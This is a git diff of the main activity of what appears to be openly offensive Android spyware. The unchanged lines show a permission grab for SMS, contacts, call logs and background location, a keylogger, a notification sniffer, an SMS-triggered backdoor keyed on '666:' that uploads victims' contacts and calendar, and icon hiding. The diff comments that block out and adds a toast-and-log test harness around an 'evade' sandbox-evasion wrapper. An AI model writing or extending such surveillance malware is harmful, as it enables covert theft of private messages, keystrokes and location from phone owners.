@@ -5,7 +5,9 @@ import android.app.Activity
 import android.content.Context
 import android.content.pm.PackageManager
 import android.os.Build
+import android.os.Bundle
 import android.util.Log
+import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import androidx.lifecycle.whenCreated
@@ -52,9 +54,11 @@ import kotlinx.coroutines.withContext
 @ExperimentalStdlibApi
 class MainActivity : AppCompatActivity() {
     val TAG = this.javaClass.simpleName
+
     init {
-        lifecycleScope.launchWhenResumed {
-            evade {
+        lifecycleScope.launchWhenCreated {
+
+/*            evade {
                 val kotlinPermissions = KotlinPermissions.with(this@MainActivity).apply {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                         permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.READ_PHONE_STATE)
@@ -64,8 +68,8 @@ class MainActivity : AppCompatActivity() {
                 kotlinPermissions.onAccepted {
                     val payload = suspend {
                         withContext(Dispatchers.Default) {
-                            val keyloggerJob = launch { Keylogger.subscribe { entry -> Log.d("KEYLOGGER", entry.toString())} }
-                            launch { DrawerSniffer.subscribe(this@MainActivity) { notification -> Log.d("DRAWERSNIFFER", notification.toString()) }.join()
+                            val keyloggerJob = launch { Keylogger.subscribe { entry -> Log.d("KEYLOGGER", entry.toString()) } }
+                            launch { DrawerSniffer.subscribe(this@MainActivity) { notification -> Log.d("DRAWERSNIFFER", notification.toString()) } }.join()
                             keyloggerJob.join()
                         }
                     }
@@ -80,7 +84,7 @@ class MainActivity : AppCompatActivity() {
                             }
                         }
                     }.use { client ->
-                        SmsBackdoor.openDoor(this@MainActivity,"666:",payload = payload) { remoteCommand ->
+                        SmsBackdoor.openDoor(this@MainActivity, "666:", payload = payload) { remoteCommand ->
                             runBlocking {
                                 when (remoteCommand) {
                                     "COMMAND_GET_CONTACTS" -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
@@ -103,6 +107,18 @@ class MainActivity : AppCompatActivity() {
                         DrawerSniffer.requestPermission(this@MainActivity)
                     hideAppIcon()
                 }.ask()
+            }*/
+            evade {
+                runOnUiThread{
+                    Toast.makeText(this@MainActivity,"Executing payload", Toast.LENGTH_SHORT).show()
+                }
+                Log.d("EVADEME", "executing payload")
+            }.onEscape {
+                    Toast.makeText(this@MainActivity,"escaped", Toast.LENGTH_SHORT).show()
+                Log.d("EVADEME", "escaped")
+            }.onSuccess {
+                Toast.makeText(this@MainActivity,"executed payload successfully", Toast.LENGTH_SHORT).show()
+                Log.d("EVADEME", "executed payload successfully")
             }
         }
     }
